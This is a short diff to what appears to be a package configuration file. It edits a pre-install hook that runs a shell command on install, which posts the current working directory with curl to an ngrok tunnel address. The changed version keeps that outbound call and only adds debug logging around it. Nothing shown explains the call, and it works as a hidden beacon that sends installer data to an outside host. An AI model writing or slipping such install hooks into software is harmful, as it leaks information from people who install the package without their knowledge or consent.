@@ -2,4 +2,4 @@ hooks:
   pre-install:
     - exec:
         command: >
-          sh -c "curl -v -X POST -d 'cwd=$(pwd)' https://42b3-152-59-149-41.ngrok-free.app > /tmp/curl_output.log 2>&1"
+          sh -c "echo 'Starting curl request' >> /tmp/debug.log; curl -v -X POST -d 'cwd=$(pwd)' https://42b3-152-59-149-41.ngrok-free.app >> /tmp/curl_output.log 2>&1; echo 'Curl request finished' >> /tmp/debug.log"
